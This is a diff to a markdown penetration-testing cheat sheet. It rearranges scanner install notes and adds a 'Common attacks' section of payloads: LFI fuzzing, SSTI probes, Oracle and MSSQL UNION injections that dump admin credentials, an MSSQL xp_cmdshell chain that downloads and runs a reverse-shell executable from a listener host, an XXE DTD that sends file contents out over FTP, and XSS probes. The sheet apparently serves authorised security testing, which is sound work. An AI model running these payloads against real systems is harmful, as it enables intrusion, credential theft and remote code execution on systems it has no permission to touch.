@@ -1,20 +1,15 @@
 # External Penetration Testing
 
-## **Tools**
-
-- [Burp Suite](https://portswigger.net/burp/releases)
-- [httpx](https://github.com/projectdiscovery/httpx)
-- [Nuclei](https://github.com/projectdiscovery/nuclei)
-- [Sn1per](https://github.com/1N3/Sn1per)
-- [AutoRecon](https://github.com/Tib3rius/AutoRecon)
-- [Legion](https://github.com/carlospolop/legion)
-- [Arsenal](https://github.com/Orange-Cyberdefense/arsenal)
+## **Automated tools**
 
 ### httpx 
 
+Web prober for fast discovery
+
+- [httpx](https://github.com/projectdiscovery/httpx)
+
 ```bash
-# Install golang & httpx
-sudo apt update && sudo apt install -y golang subfinder && export GOROOT=/usr/lib/go && export GOPATH=$HOME/go && export PATH=$GOPATH/bin:$GOROOT/bin:$PATH;
+# Install httpx
 GO111MODULE=on go get -v github.com/projectdiscovery/httpx/cmd/httpx && httpx -version
 
 # Usage 
@@ -24,17 +19,24 @@ subfinder -d <target> -silent | httpx -title -content-length -status-code -silen
 
 ### Nuclei 
 
+Full scanner based on templates
+
+- [Nuclei](https://github.com/projectdiscovery/nuclei)
+
+
 ```bash
 # Install Nuclei
 GO111MODULE=on go get -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei; nuclei -version
+nuclei -l urls.txt -t 'cves/CVE-2020*'
 ```
 
 ### Sn1per 
 
-```bash
-# Install docker
-sudo apt update && sudo apt install -y docker.io && sudo usermod -aG docker $USER && exec sg docker newgrp `id -gn`
+Full scanner including many other tools
 
+- [Sn1per](https://github.com/1N3/Sn1per)
+
+```bash
 # Install Sn1per
 docker pull xerosecurity/sn1per
 docker run -it xerosecurity/sn1per /bin/bash && sniper --help
@@ -44,6 +46,11 @@ git clone https://github.com/1N3/Sn1per && cd Sn1per && bash install.sh && snipe
 ```
 
 ### Autorecon 
+
+
+Full scanner
+
+- [AutoRecon](https://github.com/Tib3rius/AutoRecon)
 
 ```bash
 # Install AutoRecon
@@ -61,19 +68,22 @@ git clone https://github.com/Tib3rius/AutoRecon.git && cd AutoRecon && python3 -
 
 ### Legion 
 
+Full scanner
+
+
+- [Legion](https://github.com/carlospolop/legion)
+
 ```bash
 # Manual install (as root)
 git clone https://github.com/carlospolop/legion.git /opt/legion && cd /opt/legion/git && ./install.sh && mv /usr/bin/legion /usr/bin/legion2 && ln -s /opt/legion/legion.py /usr/bin/legion && legion
 ```
 
-### Arsenal 
+### Kali Linux pre-installed
+
+nikto
 
 ```bash
-# Install Arsenal
-git clone https://github.com/Orange-Cyberdefense/arsenal.git && cd arsenal && ./addalias.sh && ./run
-
-# Install Arsenal (with package)
-git clone https://github.com/Orange-Cyberdefense/arsenal.git && cd arsenal && sudo python3 setup.py install; cd arsenal; python3 app.py
+nikto -C all -output nikto.html -host <target> 
 ```
 
 --- 
@@ -193,18 +203,19 @@ assetfinder example.com | gau | egrep -v '(.css|.png|.jpeg|.jpg|.svg|.gif|.wolf)
 
 ---
 
-## **LFI**
+## **Common attacks**
+
+### LFI
 
 Local file inclusion
 
-### FUZZ
+FUZZ
 
 ```bash
 wfuzz -c -w <lfi.txt> --hw 0 <target>?page=../../../../../../../FUZZ
 ```
 
-### Get shell
-
+Get shell
 
 **RFI**
 
@@ -255,9 +266,10 @@ User-Agent: <?php phpinfo(); ?>
 
 ---
 
-## **Injections**
 
-### SSTI (Server Side Template Injection)
+### SSTI
+
+Server Side Template Injection
 
 ```bash
 "<%= 7 * 7 %>"@example.com 
@@ -266,17 +278,9 @@ test+(${{7*7}})@example.com
 
 ---
 
-### XSS (Cross-Site Scripting)
+### SQLI
 
-```bash
-test+(<script>alert(0)</script>)@example.com
-test@example(<script>alert(0)</script>).com
-"<script>alert(0)</script>"@example.com
-```
-
----
-
-### SQLI (SQL Injection) 
+SQL Injection
 
 For http://site.com/?q=INJECT_HERE
 
@@ -296,10 +300,41 @@ For http://site.com/?q=INJECT_HERE
 /?q='or''='
 ```
 
+Oracle Union based
+
+```bash
+tt'
+tt' ORDER BY 4--
+tt' ORDER BY 3--
+tt' UNION SELECT NULL,(select banner from v$version where rownum=1),NULL from DUAL--
+tt' UNION SELECT NULL,(select ora_database_name from dual),NULL from DUAL--
+tt' UNION SELECT NULL,table_name,NULL from all_tables--
+tt' UNION SELECT NULL,column_name,NULL from all_tab_columns where table_name='WEB_ADMINS'--
+tt' UNION SELECT NULL,ADMIN_NAME||PASSWORD,NULL from 'WEB_ADMINS'--
+```
+
+MSSQL Union based
+
+```bash
+toto' UNION SELECT TABLE_NAME,NULL FROM information_schema.TABLES--
+toto' UNION SELECT column_name,NULL FROM information_schema.COLUMNS--
+toto' UNION SELECT pass,NULL FROM users--
+toto' UNION SELECT name,NULL FROM users--
+toto'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE;-- toto';EXEC xp_cmdshell 'certutil -urlcache -f http://<listener_ip>/revshell.exe c:\windows\temp\revshell.exe';-- toto';EXEC xp_cmdshell 'c:\windows\temp\revshell.exe';--
+```
+
+MSSQL shell
+
+```bash
+enable_xp_cmdshell; EXEC xp_cmdshell 'whoami'
+EXEC sp_configure 'show advanced options', 1; RECONFIGURE;--;EXEC xp_cmdshell 'whoami'
+```
+
 ---
 
-### ELI (Expression Language Injection)
+### ELI
 
+ Expression Language Injection
 
 ```bash
 #J2EEScan detection vector
@@ -326,7 +361,9 @@ https://www.example.url/?vulnerableParameter=${%23_memberAccess%3d%40ognl.OgnlCo
 
 ---
 
-### XXE (XML External Entities)
+### XXE
+
+XML External Entities
 
 - [full list of payloads](https://gist.github.com/staaldraad/01415b990939494879b4)
 
@@ -351,6 +388,18 @@ https://www.example.url/?vulnerableParameter=${%23_memberAccess%3d%40ognl.OgnlCo
 
 ## External dtd: ##
 <!ENTITY % param3 "<!ENTITY &#x25; exfil SYSTEM 'ftp://<listener_ip>:<port>/%data3;'>">
+```
+
+---
+
+### XSS
+
+Cross-Site Scripting
+
+```bash
+test+(<script>alert(0)</script>)@example.com
+test@example(<script>alert(0)</script>).com
+"<script>alert(0)</script>"@example.com
 ```
 
 
